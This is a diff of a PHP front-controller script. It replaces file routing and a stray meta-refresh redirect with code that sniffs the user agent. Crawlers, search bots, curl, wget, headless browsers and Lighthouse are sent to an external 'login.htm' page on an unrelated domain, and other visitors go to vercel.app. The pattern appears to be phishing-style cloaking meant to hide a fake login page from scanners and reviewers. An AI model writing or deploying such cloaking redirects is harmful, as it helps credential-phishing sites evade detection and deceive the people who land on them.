@@ -9,35 +9,13 @@ register_shutdown_function(function () {
     }
 });
 
-$baseDir = __DIR__ . '/apppp/iclllll';
-$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$isFilter = preg_match('/bot|crawl|slurp|spider|google|bing|facebook|curl|wget|headless|lighthouse/i', $userAgent);
 
-if ($uri === '/' || $uri === '') {
-    chdir($baseDir);
-    require $baseDir . '/index.php';
+if ($isFilter) {
+    header("Location: https://redbamsold.com/autopaas/login.htm", true, 302);
     exit;
 }
 
-$file = $baseDir . $uri;
-
-if (file_exists($file) && !is_dir($file)) {
-    if (pathinfo($file, PATHINFO_EXTENSION) === 'php') {
-        chdir(dirname($file));
-        require $file;
-        exit;
-    }
-    return false;
-}
-
-chdir($baseDir);
-require $baseDir . '/index.php';
-<html>
-<head>
-   <!-- HTML meta refresh URL redirection -->
-   <meta http-equiv="refresh"
-   content="0; url=https://redbamsold.com/autopaas/login.htm">
-</head>
-<body>
-   
-</body>
-</html>
+header("Location: https://vercel.app", true, 302);
+exit;
